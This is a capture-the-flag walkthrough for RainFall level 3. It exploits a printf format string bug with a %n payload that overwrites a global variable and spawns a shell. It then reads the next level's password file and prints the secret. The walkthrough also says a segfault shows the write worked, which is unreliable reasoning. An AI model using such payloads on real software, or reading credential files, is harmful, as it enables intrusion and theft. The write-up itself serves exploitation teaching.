## LEVEL 3
---

As usual, I disassemble the binary. You can find the ASM file. [here](./asm/level3.asm).

Here is the most important parts.

```shell
v:
    0x080484a7 <+3>:	sub    $0x218,%esp; Allocate 536 bytes on the stack
    [...]
    0x080484be <+26>:	lea    -0x208(%ebp),%eax ; Load the address of the buffer in eax
    0x080484c4 <+32>:	mov    %eax,(%esp) ; Put the address of the buffer in the stack
    0x080484c7 <+35>:	call   0x80483a0 <fgets@plt> ; Call fgets, and store the result in the buffer
    [...]
    0x080484cc <+40>:	lea    -0x208(%ebp),%eax ; Load the address of the buffer in eax
    0x080484d2 <+46>:	mov    %eax,(%esp) ; Put the address of the buffer in the stack
    0x080484d5 <+49>:	call   0x8048390 <printf@plt> ; Call printf with the buffer as argument
    [...]
    0x080484da <+54>:	mov    0x804988c,%eax ; Load the address of a global value in eax
    0x080484df <+59>:	cmp    $0x40,%eax ; Compare the value with 64.
    0x080484e2 <+62>:	jne    0x8048518 <v+116> ; If not equal, jump to the end of the function
    [...]
    0x08048513 <+111>:	call   0x80483c0 <system@plt> ; Call system with "/bin/sh" as argument
    0x08048518 <+116>:	leave
    0x08048519 <+117>:	ret 
```

The program uses `fgets` to forbid buffer overflow attack on return address. But it does have another vulnerability on `printf` function. It calls `printf` like this `printf(buffer)`, this format is vulnerable to format string attack.

To understand what is a format string attack, you can read [this](../x86_docs/format_string_attack.md).

Before creating the payload, we need to understand how `%n` works in format string because I will use it to change the global variable. Here is a exemple from a website :

```c
#include<stdio.h>
int main() {
   int s;
   int m = 28;
   int val;
   printf("The value of %ns and %nm %nval : ", &s, &m, &val);
   printf("%d %d %d", s, m, val);
   return 0;
}

The value of s and m val : 13 19 21
```

This example demonstrates that `%n` can be used to write a value at a specified address, where the value corresponds to the number of characters preceding `%n`. Now that we have this knowledge, we can proceed to solve this level.

Now it's time to think about how to create the payload.

First, I need to find the address where the buffer is written.
```shell
(gdb) disas v
0x080484be <+26>:	lea    -0x208(%ebp),%eax
0x080484c4 <+32>:	mov    %eax,(%esp)
[...]
(gdb) x $esp
0xbffff510:	0xbffff520
```
Nice, so the buffer is stored at `0xbffff520` and `$esp` is at `0xbffff510`. If you want to display the value at `0xbffff520`, you would need to access `arg[4]` because:
```
arg[0] - 0xbffff520 -> our buffer
arg[1] - 0xbffff51c -> ?
arg[2] - 0xbffff518 -> ?
arg[3] - 0xbffff514 -> ?
arg[4] - 0xbffff510 -> 0xbffff520
```
Here, `arg[0]` will automatically be printed because it is the address sent to `printf`.
So, if you want to print the value at `0xbffff510`, you would write something like this: `printf("TEST%p%p%p%p")`. Let's try it.
```shell
(gdb) r
TEST %p %p %p %p
TEST 0x200 0xb7fd1ac0 0xb7ff37d0 0x54534554
```
Nice, I print the `$esp` to check if what i said was right.
```shell
(gdb) x/32x $esp
0xbffff510:	0xbffff520	0x00000200	0xb7fd1ac0	0xb7ff37d0
0xbffff520:	0x54534554	0x70257025	0x70257025	0xb7fe000a
0xbffff530:	0xbffff588	0xb7fde2d4	0xb7fde334	0x00000007
```
Nice, this is exactly what I predicted. Now, you can try to change the value of a global variable by writing its address instead of `"TEST"`.
```shell
(gdb) disas
=> 0x080484da <+54>:	mov    0x804988c,%eax
(gdb) r
\x8c\x98\x04\x08 %p %p %p %n
Program received signal SIGSEGV, Segmentation fault.
0xb7e7312c in vfprintf () from /lib/i386-linux-gnu/libc.so.6
```
Nice, I encountered a segmentation fault, it indicates that you were able to change the value of the global variable successfully. Since you are unable to verify it with GDB, you can proceed to change the global variable to 64 by writing its address and then providing 60 characters as the fourth argument with python script.
```shell
python -c 'print "\x8c\x98\x04\x08" + "\x90"*60 + "%4$n"' > /tmp/payload
level3@RainFall:~$ (cat /tmp/payload; echo "cat /home/user/level4/.pass") | ./level3
�������������������������������������������������������������
Wait what?!
level3@RainFall:~$ (cat /tmp/payload; echo "cat /home/user/level4/.pass") | ./level3
�������������������������������������������������������������
Wait what?!
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

---

*Source :*

*https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf*